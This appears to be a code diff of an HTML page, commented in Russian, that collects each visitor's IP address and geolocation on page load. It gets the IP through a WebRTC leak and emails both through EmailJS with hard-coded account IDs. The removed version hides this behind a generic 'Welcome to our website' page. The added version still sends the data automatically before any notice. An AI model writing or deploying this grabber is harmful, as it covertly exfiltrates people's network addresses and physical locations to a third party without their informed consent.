@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Collection</title>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <title>Send IP and Location</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
     <script>
-        (function() {
-            emailjs.init("k63mIxIV2m-x_kXBeasoc"); // Ваш User ID
-        })();
+        // Инициализация EmailJS с вашим публичным User ID
+        emailjs.init("nRcxesuNKhp7AMc4d");  // Замените на ваш публичный User ID
 
-        function getUserIP(onNewIP) { 
+        // Функция для получения IP адреса
+        function getUserIP(onNewIP) {
             var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
             var pc = new myPeerConnection({
                 iceServers: []
@@ -26,13 +26,11 @@
             }
 
             pc.createDataChannel("");
-
             pc.createOffer().then(function(sdp) {
                 sdp.sdp.split('\n').forEach(function(line) {
                     if (line.indexOf('candidate') < 0) return;
                     line.match(ipRegex).forEach(iterateIP);
                 });
-
                 pc.setLocalDescription(sdp, noop, noop);
             }).catch(function(reason) {});
 
@@ -42,50 +40,52 @@
             };
         }
 
-        function sendDataToEmail(userData) {
-            console.log("Sending data to email:", userData);  // Логируем данные, которые отправляются
-            emailjs.send("Hjikwe21782", "template_73zczgq", userData) // Используем правильный Service ID
+        // Функция для отправки данных
+        function sendData(userData) {
+            emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                 .then(function(response) {
-                    console.log("Sent email successfully", response);
+                    console.log("Email sent successfully", response);
+                    alert('Данные отправлены на вашу почту!');
                 }, function(error) {
-                    console.log("Failed to send email", error);
+                    console.error("Failed to send email", error);
+                    alert("Ошибка при отправке данных: " + error.text);
                 });
         }
 
-        function collectData() {
+        // Запрос геолокации и отправка данных
+        function getUserData() {
             let userData = {};
 
             getUserIP(function(ip) {
                 userData.ip = ip;
+                console.log("IP:", ip);  // Выводим IP в консоль для проверки
             });
 
-            // Проверка, если это Chrome
-            const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
-
-            if (isChrome && navigator.geolocation) {
-                // Запрос геолокации, если это Chrome
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     userData.location = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude
                     };
-                    sendDataToEmail(userData); // Отправка данных на email
+                    console.log("Location:", userData.location);  // Выводим геолокацию в консоль для проверки
+                    sendData(userData);  // Отправляем данные
                 }, function(error) {
-                    console.log('Error getting location: ' + error.message);
-                    sendDataToEmail(userData); // Даже если ошибка, отправляем доступные данные
+                    alert('Ошибка при получении геолокации: ' + error.message);
+                    sendData(userData);  // Отправляем данные без геолокации
                 });
             } else {
-                console.log("Geolocation is not available or browser is not Chrome.");
-                sendDataToEmail(userData); // Если не Chrome или геолокация не доступна, отправим только IP
+                alert("Геолокация не поддерживается этим браузером.");
+                sendData(userData);  // Отправляем данные без геолокации
             }
         }
 
+        // При загрузке страницы собираем данные и отправляем
         window.onload = function() {
-            collectData(); // Сбор данных при загрузке страницы
+            getUserData();
         }
     </script>
 </head>
 <body>
-    <h1>Welcome to our website</h1>
+    <h1>Данные отправляются на вашу почту</h1>
 </body>
 </html>
